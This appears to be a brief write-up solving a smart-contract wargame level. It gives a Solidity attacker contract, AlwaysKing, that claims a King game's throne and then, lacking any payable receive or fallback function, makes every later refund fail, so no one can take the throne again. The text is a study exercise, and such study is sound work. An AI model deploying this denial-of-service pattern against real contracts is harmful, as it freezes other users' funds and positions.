```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AlwaysKing {
  constructor() public {}

  function becomeKing(address payable _targetAddress) public payable {
    (bool success,)= _targetAddress.call{value: msg.value}("");
    require(success==true);
  }
}
```

We can solve this level by deploying a contract for example AlwaysKing with a function becomeKing to transfer ether greater or equal to the prize to become the king and When other players try to become king submitting more ether than the prize the King contract fails to transfer amount to the AlwaysKing contract as it fails to implement the payable receive or fallback function to receive the ether and no one can ever claim the king position.